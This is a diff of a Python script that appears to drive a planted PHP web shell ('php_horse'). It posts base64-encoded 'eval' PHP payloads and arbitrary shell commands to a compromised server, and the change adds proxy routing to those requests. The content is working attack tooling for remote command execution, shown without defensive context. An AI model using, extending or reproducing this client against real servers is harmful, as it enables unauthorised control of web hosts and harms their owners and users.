@@ -1,11 +1,17 @@
 import requests
+
+proxy=None
+def set_agent(p):#设置代理
+    global proxy
+    proxy=p
+
 header = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'}
 def base64(tstr):
 	import base64
 	return base64.b64encode(tstr.encode('utf-8'))
 def path(url,parameter,header):
 	post_data="eval(base64_decode(\"JGRpcj1kaXJuYW1lKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7IHByaW50ICRkaXI7\"));"
-	r=requests.post(url,data={parameter:post_data},headers=header)
+	r=requests.post(url,data={parameter:post_data},headers=header,proxies=proxy)
 	return r.text
 def regularex(estring): #正则匹配
 	import re
@@ -30,7 +36,7 @@ def php_horse(url,parameter,header,pa=""):
 	command="cd \""+str(file_path)+"\";"+str(cmd)+";pwd;"
 	command=base64(command)
 	#tphp为base64编码后的字符串
-	r=requests.post(url,data={parameter:zaphp,'z0':zbphp,'z1':linux_shell,'z2':command.decode('utf-8')},headers=header)
+	r=requests.post(url,data={parameter:zaphp,'z0':zbphp,'z1':linux_shell,'z2':command.decode('utf-8')},headers=header,proxies=proxy)
 	result=regularex(r.text)
 	#print(result)
 	for i in range(len(result)-3):
